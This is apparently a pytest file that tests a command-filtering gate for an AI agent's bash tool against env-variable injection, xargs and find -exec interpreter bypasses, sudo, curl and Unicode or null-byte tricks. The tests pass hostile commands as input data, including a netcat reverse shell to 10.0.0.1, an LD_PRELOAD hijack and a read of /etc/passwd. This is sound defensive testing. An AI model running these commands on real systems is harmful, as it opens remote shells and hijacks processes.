"""Tests for confirmed shell security bypass vectors (P2-1/P2-2).

Covers:
- env VAR=val injection (HIGH)
- xargs interpreter -c bypass (HIGH)
- find -exec shell/interpreter bypass (CRITICAL)
- DANGEROUS level now blocked in bash() and bash_readonly()
- Unicode/null-byte normalization
"""

from __future__ import annotations

import pytest

from src.tools._bash_exec import (
    _check_shell_flags,
    _normalize_command,
    bash,
    bash_readonly,
)


# ---------------------------------------------------------------------------
# Helper: parse cmd_parts + first_cmd for _check_shell_flags
# ---------------------------------------------------------------------------

import shlex as _shlex


def _shell_flags(cmd: str):
    parts = _shlex.split(cmd)
    return _check_shell_flags(parts, parts[0].lower())


# ===========================================================================
# env VAR=val injection
# ===========================================================================


class TestEnvVarInjection:
    def test_ld_preload_blocked(self):
        result = _shell_flags("env LD_PRELOAD=/tmp/evil.so ls")
        assert result is not None
        assert "error" in result
        assert "LD_PRELOAD" in result["error"]

    def test_pythonpath_blocked(self):
        result = _shell_flags("env PYTHONPATH=/tmp python3 script.py")
        assert result is not None
        assert "error" in result

    def test_path_hijack_blocked(self):
        result = _shell_flags("env PATH=/tmp:$PATH ls")
        assert result is not None
        assert "error" in result

    def test_env_i_still_blocked(self):
        result = _shell_flags("env -i ls")
        assert result is not None
        assert "error" in result

    def test_env_without_assignment_allowed(self):
        # plain "env ls" with no variable assignment should pass this gate
        result = _shell_flags("env ls")
        assert result is None

    def test_env_u_flag_allowed(self):
        # env -u VAR cmd is a flag, not an assignment; should pass this gate
        result = _shell_flags("env -u HOME ls")
        assert result is None


# ===========================================================================
# xargs interpreter -c bypass
# ===========================================================================


class TestXargsInterpreterBypass:
    def test_xargs_python3_c_blocked(self):
        result = _shell_flags("xargs python3 -c 'import os; os.system(\"id\")'")
        assert result is not None
        assert "error" in result

    def test_xargs_node_e_blocked(self):
        result = _shell_flags("xargs node -e 'require(\"child_process\").exec(\"id\")'")
        assert result is not None
        assert "error" in result

    def test_xargs_ruby_e_blocked(self):
        result = _shell_flags("xargs ruby -e 'system(\"id\")'")
        assert result is not None
        assert "error" in result

    def test_xargs_python3_script_allowed(self):
        # xargs python3 script.py is fine (no inline -c flag)
        result = _shell_flags("xargs python3 script.py")
        assert result is None

    def test_xargs_grep_allowed(self):
        result = _shell_flags("xargs grep foo")
        assert result is None


# ===========================================================================
# find -exec shell/interpreter bypass
# ===========================================================================


class TestFindExecBypass:
    def test_find_exec_sh_c_blocked(self):
        result = _shell_flags(r"find . -maxdepth 0 -exec sh -c 'id' \;")
        assert result is not None
        assert "error" in result
        assert "sh" in result["error"] or "shell" in result["error"]

    def test_find_exec_bash_blocked(self):
        result = _shell_flags(r"find . -maxdepth 0 -exec bash -c 'id' \;")
        assert result is not None
        assert "error" in result

    def test_find_exec_python3_c_blocked(self):
        result = _shell_flags(r"find . -maxdepth 0 -exec python3 -c 'import os' \;")
        assert result is not None
        assert "error" in result

    def test_find_execdir_sh_blocked(self):
        result = _shell_flags(r"find . -execdir sh -c 'id' \;")
        assert result is not None
        assert "error" in result

    def test_find_exec_nc_blocked(self):
        # nc is in _COMMAND_DENYLIST
        result = _shell_flags(r"find . -exec nc -e /bin/sh 10.0.0.1 4444 \;")
        assert result is not None
        assert "error" in result

    def test_find_exec_safe_command_allowed(self):
        # find -exec cat is fine
        result = _shell_flags(r"find . -name '*.txt' -exec cat {} \;")
        assert result is None

    def test_find_exec_python3_script_allowed(self):
        # find -exec python3 script.py {} is fine (no -c flag)
        result = _shell_flags(r"find . -exec python3 script.py {} \;")
        assert result is None


# ===========================================================================
# DANGEROUS level now hard-blocked in bash() and bash_readonly()
# ===========================================================================


class TestDangerousLevelBlocked:
    """sudo is rated DANGEROUS by analyze_bash_command but was previously only
    caught by later gates.  Now DANGEROUS is treated as BLOCKED in Gate 2."""

    def test_sudo_blocked_in_bash(self):
        result = bash("sudo ls")
        assert result["status"] == "error"

    def test_sudo_blocked_in_bash_readonly(self):
        result = bash_readonly("sudo ls")
        assert result["status"] == "error"

    def test_curl_blocked_in_bash(self):
        # curl is DANGEROUS (and also RESTRICTED) — should still be blocked
        result = bash("curl http://example.com")
        assert result["status"] == "error"


# ===========================================================================
# Unicode normalization
# ===========================================================================


class TestUnicodeNormalization:
    def test_nfkc_fullwidth_chars_normalized(self):
        # Fullwidth 'ｌｓ' (U+FF4C U+FF53) normalizes to ASCII 'ls'
        normalized = _normalize_command("ｌｓ")
        assert normalized == "ls"

    def test_null_byte_stripped(self):
        normalized = _normalize_command("cat\x00/etc/passwd")
        assert "\x00" not in normalized

    def test_zero_width_space_stripped(self):
        # U+200B ZERO WIDTH SPACE is a Cf (format) character
        normalized = _normalize_command("ls\u200b -la")
        assert "\u200b" not in normalized

    def test_normal_whitespace_preserved(self):
        normalized = _normalize_command("ls -la\t/tmp\n")
        assert "\t" in normalized
        assert "\n" in normalized

    def test_command_with_null_byte_blocked_in_bash(self):
        result = bash("cat\x00/etc/passwd")
        # After normalization null byte is stripped; "cat/etc/passwd" is not in SAFE_COMMANDS
        assert result["status"] == "error"

    def test_command_with_zero_width_space_blocked_in_bash(self):
        # "ls\u200b" after normalization becomes "ls " — the trailing space won't
        # affect gate logic since we shlex.split; but let's confirm no crash.
        result = bash("ls\u200b -la")
        # ls is in SAFE_COMMANDS — this should succeed (normalization removed the zwsp)
        assert result["status"] in ("ok", "error")  # may fail if ls errors, but not a crash
